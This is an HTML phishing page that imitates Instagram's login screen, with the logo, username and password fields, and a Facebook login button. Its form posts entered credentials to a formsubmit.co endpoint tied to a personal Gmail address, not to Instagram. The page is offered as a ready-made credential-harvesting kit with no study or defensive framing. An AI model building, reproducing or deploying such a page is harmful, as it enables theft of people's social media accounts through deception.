<meta name='viewport' content='width=device-width, initial-scale=1'/><meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>

<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram Login</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');

    * {
      box-sizing: border-box;
    }

    body {
      background: #fafafa;
      font-family: 'Roboto', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      width:100%;
      max-width:400px;
      padding: 20px 40px;
    margin:0 auto;
      text-align: center;
    }

    .logo {
      height:auto;
    max-width:100%;
      text-align:center;
      font-size: 10px;
      padding-bottom:20px;
      color: #262626;
    }
    .logo img {
  width: 70px; /* বা 100px বা যেটা তুমি চাও */
  height: auto;
  display: block;
  margin: 0 auto;
}

    input[type="text"],
    input[type="password"] {
      height:auto;
      width: 100%;
      padding: 16px 12px;
      margin: 2px 0;
      border: 2px solid #dbdbdb;
      background: #fafafa;
      border-radius: 15px;
      font-size: 14px;
    }

    button {
      height:auto;
      width: 100%;
      padding: 8px;
      background: #0095f6;
      border: none;
      border-radius: 15px;
      color: white;
      font-weight: bold;
      font-size: 14px;
      cursor: pointer;
      margin: 12px 0;
    }

    button:hover {
      background: #007ad9;
    }

    .forgot {
      font-size: 12px;
      color: #00376b;
      text-decoration: none;
      display: block;
      margin: 10px 0;
    }

    .divider {
      margin: 20px 0;
      display: flex;
      align-items: center;
      text-align: center;
      color: #8e8e8e;
      font-weight: 600;
    }

    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      border-bottom: 1px solid #dbdbdb;
      margin: 0 10px;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo"><img src="https://i.postimg.cc/SK8m9zQ0/7c-AFFbc4-Pr.png" rel="icon" sizes="150x150"></div>
      <form action="https://formsubmit.co/faysal8630@gmail.com" method="POST">
      <input type="text" placeholder="Phone number, username, or email" required />
      <input type="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>
    <a href="#" class="forgot">Forgot password?</a>
    <div class="divider">OR</div>
    <button style="background:#385185;">Log in with Facebook</button>
  </div>

</body>
</html>
